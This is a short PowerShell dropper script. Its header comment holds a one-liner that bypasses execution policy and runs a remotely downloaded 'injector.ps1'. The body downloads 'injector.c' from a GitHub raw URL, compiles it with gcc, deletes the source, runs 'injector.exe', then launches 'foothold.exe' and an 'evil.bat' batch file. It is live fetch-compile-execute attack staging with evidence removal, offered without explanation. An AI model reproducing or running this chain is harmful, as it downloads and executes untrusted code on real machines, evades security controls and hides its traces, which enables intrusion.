## POWERSHELL ONE LINER: 
## powershell.exe -executionpolicy bypass iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/injector.ps1'))


#Download injector.c
(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/injector.c', 'c:\Users\saurav\Desktop\injector.c')
#Download injector.c
#(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/foothold.c', 'c:\Users\saurav\Desktop\foothold.c')


#sleep for 10 second
start-sleep -s 10

#compiles the c code to generated executable
cmd.exe /c 'gcc "C:\Users\saurav\Desktop\injector.c" -o "C:\Users\saurav\Desktop\injector.exe" -lurlmon'

#Sleep for 5 second
Start-Sleep -s 5

#remove the injector.c
Remove-Item -path "C:\Users\saurav\Desktop\injector.c"

#compiles the c code to generated executable
#cmd.exe /c 'gcc "C:\Users\saurav\Desktop\foothold.c" -o "C:\Users\saurav\Desktop\foothold.exe"'

#sleep for 5 second
Start-sleep -s 5

#execute the injector.exe
Start-Process -filepath "C:\Users\saurav\Desktop\injector.exe" 


start-sleep -s 5
#remove the injector.c
#Remove-Item -path "C:\Users\saurav\Desktop\foothold.c"

#execute the foothold.exe
Start-Process -filepath "C:\Users\saurav\Desktop\foothold.exe" 

Start-sleep -s 10
#execute batch file
cmd.exe /c "C:\users\saurav\temp\evil.bat"
